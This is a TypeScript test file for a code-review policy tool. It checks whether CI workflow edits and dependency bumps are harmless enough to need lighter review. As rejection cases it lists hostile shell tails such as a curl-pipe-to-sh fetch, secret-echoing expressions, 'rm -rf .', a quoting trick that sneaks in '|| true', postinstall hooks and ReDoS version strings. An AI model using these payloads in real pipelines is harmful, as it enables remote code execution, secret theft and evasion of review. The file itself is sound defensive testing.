import { afterAll, expect, setDefaultTimeout, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { manifestEdit } from "@/packages/workit-core/src/core/policy/dep-bump";
import {
  branchLane,
  computeLane,
  laneGate,
  type ChangedFile,
} from "@/packages/workit-core/src/core/policy/lane";
import {
  parseWorkflowYaml,
  workflowEdit,
} from "@/packages/workit-core/src/core/policy/workflow-edit";

// #891: an additive CI-workflow edit follows the rest of the diff's lane, and
// a dependency bump (pins, lockfile, changelog, new scripts) is self with
// green CI on the head as its evidence.

if (process.platform === "win32") setDefaultTimeout(60_000);

const CI = `name: CI
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    uses: acme/workflows/.github/workflows/node.yml@v3
    with:
      lint_command: npm run lint
  test:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - name: Test
        run: |
          npm ci
          npm test
  build:
    runs-on: ubuntu-latest
    steps:
    - run: npm run build
`;
const LINT_APPENDED = CI.replace(
  "lint_command: npm run lint\n",
  `lint_command: npm run lint && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")\n`,
);

const GRAMMAR_CI = `name: CI
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    uses: acme/workflows/.github/workflows/node.yml@v3
    with:
      lint_command: npm run lint
      run_tests: 'true'
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: codecov/codecov-action@v4
        with:
          fail_ci_if_error: "true"
          command: npm test
      - name: Test
        run: |-
          npm ci
          npm test
      - run: npm run e2e \\
  build:
    runs-on: ubuntu-latest
    steps:
    - run: npm run build
`;
const edit = (from: string, to: string) => {
  const after = GRAMMAR_CI.replace(from, () => to);
  if (after === GRAMMAR_CI) throw new Error(`fixture has no ${from}`);
  return workflowEdit(GRAMMAR_CI, after);
};
const OUTSIDE = '(outside plain words and "double-quoted text")';
const FORM = 'more than && <command> or && (<command> || echo "<text>")';
const build = "jobs.build.steps[0].run";

test("workflow: the allowed forms of an appended command are additive", () => {
  expect(
    edit(
      "lint_command: npm run lint\n",
      `lint_command: npm run lint && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")\n`,
    ),
  ).toEqual({ additive: true, detail: "jobs.lint.with.lint_command appended" });
  for (const tail of [
    " && npm run size",
    " && npm run a && npm run b",
    " && (npm run x || true)",
    " && (npm run x)",
    " && npx --yes @acme/tidy@2.3.1 check --max-warnings=0 src/,test/",
    ' && ./scripts/check.sh "a b" c',
  ])
    expect(edit("- run: npm run build", `- run: npm run build${tail}`)).toEqual({
      additive: true,
      detail: `${build} appended`,
    });
  // The last line of a `|-` block grows the same way.
  expect(edit("          npm test\n", "          npm test && npm run e2e\n").additive).toBe(true);
});

test("workflow: an appended text outside the allowed form stays full, whatever its quoting", () => {
  for (const [tail, why] of [
    // The recheck's payload (verdict mwnshd5b): bash reads $'\'' as one quote, so || true ran.
    [" && echo $'\\'' || true #'", `the character $ ${OUTSIDE}`],
    [' && echo $"a" || true', `the character $ ${OUTSIDE}`],
    [" && echo 'a' || true", `the character ' ${OUTSIDE}`],
    [" && npm run x || true", FORM],
    [" && (npm run x || true) || true", FORM],
    [" && (npm run x || rm -rf .)", FORM],
    [" && (npm run x || exit 0)", FORM],
    [" && ((npm run x) || true)", FORM],
    [" && (npm run x || true", FORM],
    [" && PATH=/tmp/x npm run x", FORM],
    [' && "exit" 0', FORM],
    [" && npm run x; true", `the character ; ${OUTSIDE}`],
    [" && curl -s https://x.example | sh", `the character | ${OUTSIDE}`],
    [" && npm run x &", `the character & ${OUTSIDE}`],
    [" && echo x >> $GITHUB_ENV", `the character > ${OUTSIDE}`],
    [" && cat <(false || true)", `the character < ${OUTSIDE}`],
    [" && { npm run x || true; }", `the character { ${OUTSIDE}`],
    [" && echo $(id)", `the character $ ${OUTSIDE}`],
    [" && echo `id`", `the character \` ${OUTSIDE}`],
    [" && echo \\", `the character \\ ${OUTSIDE}`],
    [' && ex"it" 0', `the character " ${OUTSIDE}`],
    [' && echo "cost $HOME"', 'a "quoted text" left open or holding $, a backtick or a backslash'],
    [
      ' && echo "a\\"" || true "',
      'a "quoted text" left open or holding $, a backtick or a backslash',
    ],
    [" && exit 0", "the shell command exit"],
    [" && set +e", "the shell command set"],
    [" && EXIT 0", "the shell command EXIT"],
    [" && eval npm run x", "the shell command eval"],
    [" && exec true", "the shell command exec"],
    [" && source ./x.sh", "the shell command source"],
    [" && . ./x.sh", "the shell command ."],
    [" && command exit 0", "the shell command command"],
    [" && time exit 0", "the shell command time"],
    [" && echo ${{ secrets.NPM_TOKEN }}", "an expression"],
    [" || true", "a command not chained with a leading &&"],
    ["; curl -s https://x.example | sh", "a command not chained with a leading &&"],
  ] as const)
    expect([tail, edit("- run: npm run build", `- run: npm run build${tail}`).detail]).toEqual([
      tail,
      `appends ${why} to ${build}`,
    ]);
  // In a block scalar a # is the shell's comment, not YAML's (the recheck's payload ends in one).
  expect(edit("          npm test\n", "          npm test && npm run x # note\n").detail).toBe(
    `appends the character # ${OUTSIDE} to jobs.test.steps[1].run`,
  );
  expect(
    edit("          npm test\n", "          npm test && echo $'\\'' || true #'\n").detail,
  ).toBe(`appends the character $ ${OUTSIDE} to jobs.test.steps[1].run`);
  // `cmd \` + `&& x`: the shell reads `\&` as a literal and `& x` as a background job.
  expect(edit("npm run e2e \\\n", "npm run e2e \\&& npm run x\n").detail).toBe(
    "appends a command after a trailing backslash to jobs.test.steps[2].run",
  );
});

test("workflow: only a reusable workflow's command input may grow", () => {
  // An input that is no command turns into another value (`'true'` no longer reads true).
  expect(edit("run_tests: 'true'", "run_tests: 'true && npm run x'").detail).toBe(
    "changes jobs.lint.with.run_tests",
  );
  // An action's input is not known to be a shell command.
  expect(edit('fail_ci_if_error: "true"', 'fail_ci_if_error: "true && npm run x"').detail).toBe(
    "changes jobs.test.steps[0].with.fail_ci_if_error",
  );
  expect(edit("command: npm test\n", "command: npm test && npm run x\n").detail).toBe(
    "changes jobs.test.steps[0].with.command",
  );
});

// The allowed tails, run by bash -e as GitHub runs a `run:` step: a failure before them still fails.
const GREEN_TAILS = [
  ' && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")',
  " && npm run size",
  " && npm run a && npm run b",
  " && (npm run x || true)",
  " && (npm run x)",
  " && npx --yes @acme/tidy@2.3.1 check --max-warnings=0 src/,test/",
  ' && ./scripts/check.sh "a b" c',
];

test.skipIf(process.platform === "win32")(
  "workflow: given a failing command, when an allowed tail is appended and bash -e runs it, then the step still fails",
  () => {
    for (const tail of GREEN_TAILS) {
      expect(
        workflowEdit(
          GRAMMAR_CI,
          GRAMMAR_CI.replace("- run: npm run build", () => `- run: npm run build${tail}`),
        ).additive,
      ).toBe(true);
      const run = spawnSync("bash", ["-e", "-c", `false${tail}`], {
        encoding: "utf8",
        timeout: 10_000,
        env: { PATH: process.env.PATH ?? "" },
      });
      expect([tail, run.status === 0]).toEqual([tail, false]);
    }
  },
);

test("workflow: given a guarded key, a removal, a replaced string or an unreadable file, then the edit stays full naming why", () => {
  const refused = (after: string) => workflowEdit(CI, after);
  expect(refused(CI.replace("contents: read", "contents: write"))).toEqual({
    additive: false,
    detail: "changes permissions: (permissions.contents)",
  });
  expect(refused(CI.replace("branches: [main]", "branches: [main, dev]")).detail).toBe(
    "changes on: (on.push.branches)",
  );
  expect(refused(CI.replace("checkout@v4", "checkout@v5")).detail).toBe(
    "moves a uses: ref (jobs.test.steps[0].uses)",
  );
  expect(refused(CI.replace("node.yml@v3", "node.yml@v3.1")).detail).toBe(
    "moves a uses: ref (jobs.lint.uses)",
  );
  expect(refused(CI.replace("environment: staging", "environment: production")).detail).toBe(
    "changes environment: (jobs.test.environment)",
  );
  expect(
    refused(CI.replace("      - name: Test\n", "      - name: Test\n        if: always()\n"))
      .detail,
  ).toBe("changes if: (jobs.test.steps[1].if)");
  expect(refused(CI.replace("      - uses: actions/checkout@v4\n", "")).detail).toBe(
    "removes a step from jobs.test.steps",
  );
  expect(refused(CI.replace(/ {2}build:\n[^]*$/u, "")).detail).toBe("removes the job build");
  expect(refused(CI.replace("    with:\n", "    secrets: inherit\n    with:\n")).detail).toBe(
    "changes secrets: (jobs.lint.secrets)",
  );
  // A rewrite, not an append; an appended expression can read secrets or event text.
  expect(refused(CI.replace("npm run lint", "pnpm lint")).detail).toBe(
    "changes jobs.lint.with.lint_command",
  );
  expect(
    refused(CI.replace("npm run lint\n", "npm run lint && echo ${{ secrets.NPM_TOKEN }}\n")).detail,
  ).toBe("appends an expression to jobs.lint.with.lint_command");
  expect(
    refused(
      CI.replace(
        "lint_command: npm run lint\n",
        "lint_command: npm run lint\n      token: ${{ secrets.T }}\n",
      ),
    ).additive,
  ).toBe(false);
  // A new step, a new top-level key or a new job is more than an append.
  expect(
    refused(
      CI.replace(
        "    - run: npm run build\n",
        "    - run: npm run build\n    - run: npm publish\n",
      ),
    ).detail,
  ).toBe("adds a step to jobs.build.steps");
  expect(refused(`${CI}  deploy:\n    runs-on: ubuntu-latest\n`).detail).toBe("adds jobs.deploy");
  for (const broken of [
    `${CI}  bad: [unclosed\n`,
    CI.replace(
      "runs-on: ubuntu-latest\n    environment",
      "runs-on: &os ubuntu-latest\n    environment",
    ),
    `${CI}---\nname: second\n`,
    CI.replace("contents: read", "contents: read\n  contents: write"),
  ])
    expect(refused(broken)).toEqual({
      additive: false,
      detail: "does not parse as plain workflow YAML",
    });
});

test("workflow reader: block YAML as workflows write it, refusing what it cannot read", () => {
  const doc = parseWorkflowYaml(
    "---\non: [push]\nx:\n  - a\n  - 'b ''c'''\n  - \"d\\te\"\ny: |-\n  one\n\n  two\nz: >\n  folded\n  text\nn: 3\n",
  );
  expect(doc?.kind).toBe("map");
  const entries = doc?.kind === "map" ? doc.entries : new Map();
  expect(entries.get("x")).toEqual({
    kind: "seq",
    items: [
      { kind: "scalar", text: "a", string: true, folded: false },
      { kind: "scalar", text: "b 'c'", string: true, folded: false },
      { kind: "scalar", text: "d\te", string: true, folded: false },
    ],
  });
  expect(entries.get("y")).toEqual({
    kind: "scalar",
    text: "one\n\ntwo",
    string: true,
    folded: false,
  });
  expect(entries.get("z")).toMatchObject({ text: "folded\ntext\n", folded: true });
  expect(entries.get("n")).toMatchObject({ text: "3", string: false });
  for (const text of [
    "a: *ref\n",
    "a: !!str x\n",
    "a: b\n  c\n",
    "a: 'open\n",
    "a: b: c\n",
    "a:\n\t- b\n",
  ])
    expect(parseWorkflowYaml(text)).toBeNull();
});

const PKG = `{
  "name": "app",
  "scripts": {
    "lint": "eslint ."
  },
  "dependencies": {
    "@acme/ui": "4.1.0"
  },
  "devDependencies": {
    "@acme/tidy": "^2.0.0"
  }
}
`;
const PKG_BUMPED = PKG.replace('"4.1.0"', '"4.2.0"')
  .replace('"^2.0.0"', '"^2.3.1"')
  .replace('"lint": "eslint ."', '"lint": "eslint .",\n    "tidy:check": "tidy check"');

test("manifests: given package.json pins moved and a new script, then only pins moved; any other change is named", () => {
  expect(manifestEdit("package.json", PKG, PKG_BUMPED)).toEqual({
    pins: true,
    bumped: 2,
    scripts: ["tidy:check"],
    why: "",
  });
  const why = (after: string) => manifestEdit("web/package.json", PKG, after).why;
  expect(why(PKG.replace('"4.1.0"', '"4.1.0",\n    "left-pad": "1.3.0"'))).toBe(
    "adds the dependency left-pad",
  );
  expect(why(PKG.replace('"4.1.0"', '"github:acme/ui#main"'))).toBe(
    "changes the source of @acme/ui",
  );
  expect(why(PKG.replace('"4.1.0"', '"npm:evil-ui@4.2.0"'))).toBe("changes the source of @acme/ui");
  expect(why(PKG.replace('"eslint ."', '"eslint . --fix"'))).toBe("changes the script lint");
  // npm runs a lifecycle or pre/post script on its own: never an additive script.
  expect(
    why(PKG.replace('"lint": "eslint ."', '"lint": "eslint .",\n    "postinstall": "node x"')),
  ).toBe("adds the lifecycle script postinstall");
  expect(
    why(PKG.replace('"lint": "eslint ."', '"lint": "eslint .",\n    "prelint": "node x"')),
  ).toBe("adds the lifecycle script prelint");
  expect(why(PKG.replace('"name": "app"', '"name": "app",\n  "main": "x.js"'))).toBe(
    "changes main",
  );
  expect(why("{")).toBe("does not parse");
  // A new script an existing one already runs by glob, or a pnpm: hook, joins what runs.
  const runAll = PKG.replace('"lint": "eslint ."', '"lint": "run-s \'lint:*\'"');
  expect(
    manifestEdit(
      "package.json",
      runAll,
      runAll.replace(
        '"lint": "run-s \'lint:*\'"',
        '"lint": "run-s \'lint:*\'",\n    "lint:extra": "x"',
      ),
    ).why,
  ).toBe("adds the script lint:extra, which the script lint runs by glob");
  // Any pattern token an existing script holds counts, whatever runs it; a file glob matches no script.
  const adding = (command: string) => {
    const before = PKG.replace('"eslint ."', JSON.stringify(command));
    return manifestEdit(
      "package.json",
      before,
      before

        .replace(
          `"lint": ${JSON.stringify(command)}`,
          `"lint": ${JSON.stringify(command)},\n    "lint:zz": "x"`,
        ),
    ).why;
  };
  for (const command of [
    "concurrently npm:lint:*",
    'concurrently "npm:lint:*"',
    "pnpm run /^lint:/",
  ])
    expect([command, adding(command)]).toEqual([
      command,
      "adds the script lint:zz, which the script lint runs by glob",
    ]);
  expect(adding("eslint 'src/**/*.ts'")).toBe("");
  expect(
    why(
      PKG.replace('"lint": "eslint ."', '"lint": "eslint .",\n    "pnpm:devPreinstall": "node x"'),
    ),
  ).toBe("adds the pnpm: script pnpm:devPreinstall");
  // Ranges read as versions; a long hostile one is refused, not backtracked over.
  expect(
    manifestEdit("package.json", PKG, PKG.replace('"4.1.0"', '">= 4.1.0 < 5 || 6.x"')).pins,
  ).toBe(true);
  expect(manifestEdit("package.json", PKG, PKG.replace('"4.1.0"', '"4.1.0 - 4.9.9"')).pins).toBe(
    true,
  );
  const hostile = `${"1 ".repeat(2_500)}!`;
  expect(why(PKG.replace('"4.1.0"', JSON.stringify(hostile)))).toBe(
    "changes the source of @acme/ui",
  );
});

test("manifests: a 5,000-character pathological version is read in linear time", () => {
  // The old single regex backtracked exponentially on this; the test's own timeout bounds it.
  for (const hostile of [
    `${"1 ".repeat(2_100)}1.1.1.1.1 ${"1||".repeat(300)}x`,
    // Under the length cap, so each comparator is matched.
    `${"1.1 ".repeat(30)}${"1||".repeat(20)}1.1.1.1!`,
  ]) {
    const after = PKG.replace('"4.1.0"', JSON.stringify(hostile));
    expect(manifestEdit("package.json", PKG, after).why).toBe("changes the source of @acme/ui");
  }
}, 1_000);

test("manifests: go.mod, Cargo.toml and pyproject.toml pins move; a new module, source or other line does not", () => {
  const go =
    "module x\n\ngo 1.22\n\nrequire (\n\tgithub.com/a/b v1.2.3\n\tgithub.com/c/d v0.4.0 // indirect\n)\n";
  expect(manifestEdit("go.mod", go, go.replace("v1.2.3", "v1.3.0"))).toMatchObject({
    pins: true,
    bumped: 1,
  });
  expect(manifestEdit("go.mod", go, go.replace("go 1.22", "go 1.23")).why).toBe("changes go");
  expect(manifestEdit("go.mod", go, go.replace(")\n", "\tgithub.com/e/f v1.0.0\n)\n")).pins).toBe(
    false,
  );
  const cargo =
    '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\nserde = { version = "1.0.190", features = ["derive"] }\nanyhow = "1.0"\n\n[dev-dependencies]\ninsta = "1.34"\n';
  const bumped = cargo.replace("1.0.190", "1.0.200").replace('insta = "1.34"', 'insta = "1.40"');
  expect(manifestEdit("Cargo.toml", cargo, bumped)).toMatchObject({ pins: true, bumped: 2 });
  expect(
    manifestEdit("Cargo.toml", cargo, cargo.replace('version = "0.1.0"', 'version = "0.2.0"')).pins,
  ).toBe(false);
  expect(manifestEdit("Cargo.toml", cargo, cargo.replace('"derive"', '"derive", "rc"')).pins).toBe(
    false,
  );
  expect(
    manifestEdit(
      "Cargo.toml",
      cargo,
      cargo.replace('anyhow = "1.0"', 'anyhow = { git = "https://x" }'),
    ).pins,
  ).toBe(false);
  const py = '[project]\nname = "x"\ndependencies = [\n  "requests>=2.31",\n  "rich==13.7.0",\n]\n';
  expect(manifestEdit("pyproject.toml", py, py.replace("13.7.0", "13.8.1"))).toMatchObject({
    pins: true,
    bumped: 1,
  });
  expect(
    manifestEdit("pyproject.toml", py, py.replace('"rich==13.7.0"', '"richer==13.7.0"')).pins,
  ).toBe(false);
  expect(manifestEdit("pyproject.toml", py, py.replace('name = "x"', 'name = "y"')).pins).toBe(
    false,
  );
  // A one-line list compares the requirement names, not only the versions.
  const flat = '[project]\nname = "x"\ndependencies = ["requests>=2.31", "base64x>=1.0"]\n';
  expect(manifestEdit("pyproject.toml", flat, flat.replace(">=2.31", ">=2.32"))).toMatchObject({
    pins: true,
    bumped: 1,
  });
  expect(manifestEdit("pyproject.toml", flat, flat.replace("base64x", "base65x")).pins).toBe(false);
});

const file = (name: string, lines: number, extra: Partial<ChangedFile> = {}): ChangedFile => ({
  path: name,
  added: lines,
  deleted: lines,
  ...extra,
});
const pins = { manifest: { pins: true, bumped: 2, scripts: ["tidy:check"], why: "" } };
const additive = { workflow: { additive: true, detail: "jobs.lint.with.lint_command appended" } };

test("lane: given a pin bump with a source change, then the lane is computed from the source change as before", () => {
  const assessed = computeLane({
    files: [file("package.json", 2, pins), file("package-lock.json", 40), file("src/a.ts", 3)],
  });
  expect(assessed.lane).toBe("focused");
  expect(assessed.classification).toBeUndefined();
  expect(assessed.reasons[0]).toBe("a lockfile or binary changed: package-lock.json");
  // A source change on a risk path stays full.
  expect(
    computeLane({ files: [file("package.json", 2, pins), file("src/hooks/x.ts", 1)] }).lane,
  ).toBe("full");
});

test("lane: without a dependency bump an additive workflow edit is focused, never self or none; a refused, configured or risky-named one stays full", () => {
  expect(
    computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("src/a.ts", 2)] }),
  ).toMatchObject({
    lane: "focused",
    riskFiles: [],
    reasons: [
      "an additive workflow edit needs a non-author verdict unless it rides a dependency bump",
      "small change: 6 lines in 2 files, no risk path",
      "additive workflow edit: .github/workflows/ci.yml (jobs.lint.with.lint_command appended)",
    ],
  });
  expect(
    computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("README.md", 2)] })
      .lane,
  ).toBe("focused");
  // A large diff beside it still reads full.
  expect(
    computeLane({ files: [file(".github/workflows/ci.yml", 1, additive), file("src/a.ts", 300)] })
      .lane,
  ).toBe("full");
  // GitLab CI never softens.
  expect(computeLane({ files: [file(".gitlab-ci.yml", 1, additive)] }).lane).toBe("full");
  const refused = {
    workflow: { additive: false, detail: "changes permissions: (permissions.contents)" },
  };
  // The full lane's reason names why the workflow sub-rule refused the edit.
  expect(computeLane({ files: [file(".github/workflows/ci.yml", 1, refused)] })).toMatchObject({
    lane: "full",
    reasons: [
      "touches a risk path: .github/workflows/ci.yml (changes permissions: (permissions.contents))",
    ],
  });
  expect(computeLane({ files: [file(".github/workflows/ci.yml", 1)] }).lane).toBe("full");
  expect(
    computeLane({
      files: [file(".github/workflows/ci.yml", 1, additive)],
      riskPaths: [".github/**"],
    }).lane,
  ).toBe("full");
  expect(computeLane({ files: [file(".github/workflows/release.yml", 1, additive)] }).lane).toBe(
    "full",
  );
});

test("lane: a dependency bump is self; a new dependency, a stray file or a large diff is not", () => {
  const bump = computeLane({
    files: [
      file("package.json", 3, pins),
      file("package-lock.json", 60),
      file("CHANGELOG.md", 1),
      file(".github/workflows/ci.yml", 1, additive),
    ],
  });
  expect(bump).toMatchObject({ lane: "self", classification: "dependency-bump", riskFiles: [] });
  expect(bump.reasons).toEqual([
    "dependency-bump: 2 version pins in package.json, 1 new script (tidy:check), lockfile package-lock.json; green CI on the head is its evidence",
    "additive workflow edit: .github/workflows/ci.yml (jobs.lint.with.lint_command appended)",
  ]);
  const notPins = {
    manifest: { pins: false, bumped: 0, scripts: [], why: "adds the dependency x" },
  };
  expect(
    computeLane({ files: [file("package.json", 1, notPins), file("package-lock.json", 9)] }).lane,
  ).toBe("focused");
  expect(
    computeLane({ files: [file("package.json", 1, pins), file("README.md", 2)] }).classification,
  ).toBeUndefined();
  expect(computeLane({ files: [file("package-lock.json", 60)] }).lane).toBe("focused");
  // A binary beside the bump is no bump; a binary lockfile is a lockfile.
  expect(
    computeLane({
      files: [file("package.json", 1, pins), file("logo.png", 0, { binary: true })],
    }).classification,
  ).toBeUndefined();
  expect(
    computeLane({ files: [file("package.json", 1, pins), file("bun.lockb", 0, { binary: true })] })
      .classification,
  ).toBe("dependency-bump");
  expect(computeLane({ files: [file("package.json", 300, pins), file("bun.lock", 9)] }).lane).toBe(
    "full",
  );
  expect(computeLane({ files: [file("package.json", 1, pins)], riskTier: "high" }).lane).toBe(
    "full",
  );
});

const verdictCheck = (self: string | null) =>
  ({
    accepted: { accepted: false, verdict: null, reasons: ["no_verdict"] },
    selfVerdict: self ? { id: self } : null,
  }) as never;

test("gate: given green CI absent on the head, then a dependency bump's self verdict is not enough", () => {
  const bump = { lane: "self" as const, classification: "dependency-bump" as const };
  for (const ci of [null, "pending", "failing", "none"])
    expect(laneGate(verdictCheck("v-self"), "proportional", bump, ci)).toMatchObject({
      need: "self",
      satisfied: false,
      missing: `green CI on the head (CI is ${ci ?? "unread"})`,
    });
  expect(laneGate(verdictCheck("v-self"), "proportional", bump, "passing")).toMatchObject({
    satisfied: true,
    verdictId: "v-self",
    review: "self-reviewed",
  });
  expect(laneGate(verdictCheck(null), "proportional", bump, "passing").satisfied).toBe(false);
  // An ordinary self lane does not ask for CI.
  expect(laneGate(verdictCheck("v-self"), "proportional", { lane: "self" }).satisfied).toBe(true);
});

// The #891 diff, read from git.

const roots: string[] = [];
afterAll(() => {
  for (const dir of roots) rmSync(dir, { recursive: true, force: true });
});
const git = (cwd: string, ...args: string[]) => {
  const run = spawnSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...args], {
    cwd,
    encoding: "utf8",
    timeout: 30_000,
  });
  if (run.status !== 0) throw new Error(`git ${args.join(" ")}: ${run.stderr}`);
  return run.stdout.trim();
};
const writeAll = (root: string, files: Record<string, string>) => {
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
    writeFileSync(path.join(root, name), text);
  }
  git(root, "add", "-A");
  git(root, "commit", "-q", "-m", "change");
  return git(root, "rev-parse", "HEAD");
};

const ISSUE_891_BASE: Record<string, string> = {
  "package.json": PKG,
  "package-lock.json": '{\n  "lockfileVersion": 3,\n  "packages": {}\n}\n',
  "CHANGELOG.md": "# Changelog\n\n## Unreleased\n",
  ".github/workflows/ci.yml": CI,
  "src/app.ts": "export const app = 1;\n",
};
const ISSUE_891_CHANGE: Record<string, string> = {
  "package.json": PKG_BUMPED,
  "package-lock.json": '{\n  "lockfileVersion": 3,\n  "packages": { "x": 1 }\n}\n',
  "CHANGELOG.md":
    "# Changelog\n\n## Unreleased\n\n- Bump @acme/ui and @acme/tidy; add tidy:check.\n",
  ".github/workflows/ci.yml": LINT_APPENDED,
};

test("from git: the #891 diff (two pins, a new script, lockfile, changelog line, appended with: input) is self", () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "workit-dep-bump-"));
  roots.push(root);
  git(root, "init", "-q", "-b", "main");
  writeAll(root, ISSUE_891_BASE);
  git(root, "switch", "-q", "-c", "feature/bump");
  const head = writeAll(root, ISSUE_891_CHANGE);
  const assessed = branchLane(root, { base: "main", head });
  expect(assessed).toMatchObject({
    lane: "self",
    classification: "dependency-bump",
    riskFiles: [],
  });
  expect(assessed.reasons).toEqual([
    "dependency-bump: 2 version pins in package.json, 1 new script (tidy:check), lockfile package-lock.json; green CI on the head is its evidence",
    "additive workflow edit: .github/workflows/ci.yml (jobs.lint.with.lint_command appended)",
  ]);
  // The same bump with a permissions change in the workflow stays full.
  git(root, "switch", "-q", "-c", "feature/widen", "main");
  const widened = writeAll(root, {
    ...ISSUE_891_CHANGE,
    ".github/workflows/ci.yml": LINT_APPENDED.replace("contents: read", "contents: write"),
  });
  expect(branchLane(root, { base: "main", head: widened })).toMatchObject({
    lane: "full",
    riskFiles: [".github/workflows/ci.yml"],
    reasons: [
      "touches a risk path: .github/workflows/ci.yml (changes permissions: (permissions.contents))",
    ],
  });
});
